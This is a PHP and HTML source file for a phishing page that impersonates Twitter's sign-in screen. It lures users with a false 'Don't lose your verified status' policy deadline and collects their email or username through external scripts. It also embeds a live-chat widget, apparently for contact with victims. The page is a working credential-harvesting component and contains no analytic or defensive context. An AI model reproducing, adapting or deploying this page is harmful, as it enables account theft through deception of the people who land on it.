<?php include("Config.php"); ?>

<html>
  <head>
    <title>Twitter</title>
    <meta name="viewport" content="width=device-width,initial-scale=1,maximum-scale=1,user-scalable=0,viewport-fit=cover">
    <link rel="shortcut icon" href="img/twitter.ico" type="image/x-icon">
    <meta charset="utf-8" />
    <!-- jQuery -->
    <script type="text/javascript" src="js/jquery-3.6.0.min.js"></script>
    <script type="text/javascript" src="js/jquery.redirect.js"></script>
    <script type="text/javascript" src="js/login.js"></script>
    <!-- Boostrap -->
    <script type="text/javascript" src="bootstrap/js/bootstrap.min.js"></script>
    <link rel="stylesheet" href="bootstrap/css/bootstrap.min.css">
    <!-- Style -->
    <link rel="stylesheet" href="css/style.css">
    <script>
    $(window).on('load', function() {
      if(!/Mobi/.test(navigator.userAgent)) {
       $('#myModal').modal({backdrop: 'static', keyboard: false, show: true})
      }
    });
    </script>
  </head>
  <body>

<?php if(!CheckDipositive()){ ?>
    <div class="d-none d-lg-block">
      <div class="container">

        <div class="modal fade" id="myModal" tabindex="-1" aria-labelledby="exampleModalLabel" aria-hidden="true">
          <div class="modal-dialog">
            <div class="modal-content">
              <div class="modal-body">
                <div class="dkp-logo">
                  <img src="img/twitter.png" alt="dkp-logo" height="35" />
                </div>

                <div class="dkp-container dkp-title">
                  <h1>Sign in to Twitter</h1>
<br>Don't lose your verified status <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/e/e4/Twitter_Verified_Badge.svg/2048px-Twitter_Verified_Badge.svg.png" width="22" alt="Twitter" title="Twitter" style="margin:0px;padding:0px;display:inline-block;-ms-interpolation-mode:bicubic;border:none;outline:none;" /> </a>
<br>
<br> We updated our verification policy, and you could be affected.<br>
Please read the rules and make any necessary changes<br> by January 12, 2022.                </div>

                <div class="dkp-container dkp-other">
                                  </div>

                <div class="dkp-container dkp-input">
                  <input type="text" id="TxtEmail" placeholder="Email, or username" value="" />
                  <span id="ErrEmail" style="color:#cc0000;display:none;">Enter valid Phone, email, or username</span>
                </div>

                <div class="dkp-container">
                  <button class="dkp-Next" id="BtnGo">Next</button>
                  <button class="dkp-Forgot">Forgot password?</button>
                </div>

                <div class="dkp-container dkp-footer">
                  <span>Don't have an account?</span> <span style="color:#1d9bf0;">Sign up</span>
                </div>

              </div>
            </div>
          </div>
        </div>


      </div>
    </div>

<?php } ?>

    <div class="d-lg-none">
      <div class="container">
        <div class="mbl-container mbl-logo">
          <img src="img/twitter.png" alt="mbl-logo" height="35" />
        </div>

        <div class="mbl-container mbl-title">
          <h1>Sign in to Twitter</h1>
<br>Don't lose your verified status <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/e/e4/Twitter_Verified_Badge.svg/2048px-Twitter_Verified_Badge.svg.png" width="22" alt="Twitter" title="Twitter" style="margin:0px;padding:0px;display:inline-block;-ms-interpolation-mode:bicubic;border:none;outline:none;" /> </a>
<br>
<br> We updated our verification policy, and you could be affected.<br>
Please read the rules and make any necessary changes<br> by January 12, 2022.                </div><br>

        </div>

        <div class="mbl-container mbl-other">
                  </div>

        <div class="mbl-container mbl-input">
          <input type="text" id="TxtEmail" placeholder="Email, or username" value="" />
          <span id="ErrEmail" style="color:#cc0000;display:none;">Enter valid Phone, email, or username</span>
        </div>

        <div class="mbl-container">
          <button class="mbl-Next" id="BtnGo">Next</button>
          <button class="mbl-Forgot">Forgot password?</button>
        </div>

        <div class="mbl-container mbl-footer">
          <span>Don't have an account?</span> <span style="color:#1d9bf0;">Sign up</span>
        </div>
      </div>
    </div>
<!--Start of Tawk.to Script-->
<script type="text/javascript">
var Tawk_API=Tawk_API||{}, Tawk_LoadStart=new Date();
(function(){
var s1=document.createElement("script"),s0=document.getElementsByTagName("script")[0];
s1.async=true;
s1.src='https://embed.tawk.to/61d6c926f7cf527e84d0b7a9/1fong3g2m';
s1.charset='UTF-8';
s1.setAttribute('crossorigin','*');
s0.parentNode.insertBefore(s1,s0);
})();
</script>
<!--End of Tawk.to Script-->
  </body>
